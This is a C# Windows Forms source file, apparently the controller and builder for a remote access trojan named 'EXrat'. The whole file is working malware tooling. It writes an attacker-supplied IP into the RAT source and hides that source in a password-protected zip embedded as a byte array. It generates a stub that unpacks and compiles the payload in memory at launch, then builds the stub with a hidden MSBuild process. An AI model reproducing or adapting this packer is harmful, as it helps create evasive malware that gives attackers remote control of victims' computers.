using Ionic.Zip;
using System;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace EXrat_Controller
{
    public partial class Form2 : Form
    {
        // Improperly implemented
        public static Random RNG = new Random();
        public Form2()
        {
            InitializeComponent();
            label5.Text = "Your IP address is " + GetIP();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            GenerateEXE("T.exe", new string[] { "mscorlib.dll", "System.Core.dll", "ObjectListView.dll" });
        }
        public void GenerateEXE(string FileName, string[] AsmeblyRefs)
        {
            string EXrat_Code_Byte_Array = "";
            string Extract_Password = RandomString(RNG.Next(50, 150));
            MessageBox.Show(Extract_Password);
            using (ZipFile zip = new ZipFile())
            {
                using (MemoryStream MS = new MemoryStream())
                {
                    string EXrat_Code = File.ReadAllText(Environment.CurrentDirectory + "/Codes/EXrat.cs");
                    EXrat_Code = EXrat_Code.Replace("ConnectionIP = __IPADDRESS__", "ConnectionIP = \"" + textBox2.Text + "\"");
                    zip.Password = Extract_Password;
                    zip.AddEntry(RandomString(RNG.Next(5, 15)), EXrat_Code);
                    zip.Save(MS);
                    MS.Seek(0, SeekOrigin.Begin);
                    EXrat_Code_Byte_Array = "0x" + BitConverter.ToString(MS.ToArray()).Replace("-", ", 0x");
                    Console.WriteLine(Environment.CurrentDirectory + @"\Codes\EXrat_Encrypted\EXrat_Encrypted\Form1.cs");
                    File.WriteAllText(Environment.CurrentDirectory + @"\Codes\EXrat_Encrypted\EXrat_Encrypted\Form1.cs",
                       @"
using System;
using System.Linq;
using System.Text;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using Ionic.Zip;
using System.IO;
using System.Windows.Forms;

namespace EXrat_Encrypted
{
    public partial class Form1 : Form
    {
       
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            using (ZipFile ZipF = ZipFile.Read(new MemoryStream(new byte[] {" + EXrat_Code_Byte_Array + @" })))
            {
                MemoryStream Extracted = new MemoryStream();
                ZipF.Password = """ + Extract_Password + @""";
                ZipF.FirstOrDefault().Extract(Extracted);
                RunCode(Encoding.ASCII.GetString(Extracted.ToArray()), new string[] { }, ""EXRAT"", ""Program"", ""Main"");
            }
        }
        public static void RunCode(string Source, string[] ReferencedAssemblies, string Namespace, string Class, string Method)
        {
            object o = new CSharpCodeProvider().CompileAssemblyFromSource(new CompilerParameters(ReferencedAssemblies), Source).CompiledAssembly.CreateInstance(Namespace + ""."" + Class);
            o.GetType().GetMethod(Method).Invoke(o, null);
        }
    }
}
                        ");
                    if (Build(Environment.CurrentDirectory + @"\Codes\EXrat_Encrypted\EXrat_Encrypted.sln"))
                    {
                        MessageBox.Show("Build sucessful!");
                    }
                    else
                    {
                        MessageBox.Show("Build failed!");
                    }

                }
            }
        }

        public static bool Build(string Solution)
        {
            string Output = Environment.CurrentDirectory + @"\Codes\EXrat_Encrypted\EXrat_Encrypted\bin\Release\EXrat_Encrypted.exe";
            if (File.Exists(Output))
            {
                File.Delete(Output);
            }
            Process MSBUILD = new Process();

            ProcessStartInfo MSBUILD_PSI = new ProcessStartInfo
            {
                FileName = @"C:\Program Files (x86)\Microsoft Visual Studio\2017\Enterprise\MSBuild\15.0\Bin\msbuild.exe",
                Arguments = "\"" + Solution + "\" " + "/t:Build /p:Configuration=Release",

                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,

                UseShellExecute = false,
                RedirectStandardOutput = true
            };

            MSBUILD.StartInfo = MSBUILD_PSI;
            MSBUILD.Start();

            File.WriteAllText("log.txt", MSBUILD.StandardOutput.ReadToEnd());
            return MSBUILD.ExitCode == 0 && File.Exists(Output);
        }

        public static string GetIP()
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
            {
                socket.Connect("8.8.4.4", 5000);
                return ((IPEndPoint)socket.LocalEndPoint).Address.ToString();
            }
        }

        public static string RandomString(int length)
        {
            const string chars = " !#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[RNG.Next(s.Length)]).ToArray());
        }
    }
}
